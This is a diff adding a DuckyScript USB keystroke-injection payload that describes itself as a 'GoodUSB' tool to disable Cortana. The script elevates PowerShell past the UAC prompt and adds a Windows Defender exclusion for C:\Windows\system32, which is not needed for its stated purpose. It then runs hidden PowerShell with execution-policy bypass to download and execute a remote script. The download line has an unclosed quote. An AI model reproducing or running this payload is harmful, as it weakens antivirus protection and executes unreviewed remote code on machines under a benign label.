@@ -1,0 +1,19 @@
+REM Author: UNC0V3R3D
+REM Description: Disable the really annoying Cortana assistant.
+REM Version: 1.0
+REM Category: GoodUSB
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+CTRL-SHIFT ENTER
+DELAY 1500
+SHIFT TAB
+DELAY 500
+ENTER
+DELAY 1500
+STRING Add-MpPreference -ExclusionPath C:\Windows\system32
+ENTER
+DELAY 500
+STRING powershell -w h -ep bypass -Command  "iex (iwr -uri 'https://raw.githubusercontent.com/Zenin0/Glitter_Scripts/main/Windows/GoodUSB/Disable_Cortana/disable_cortana.ps1).Content"
+ENTER
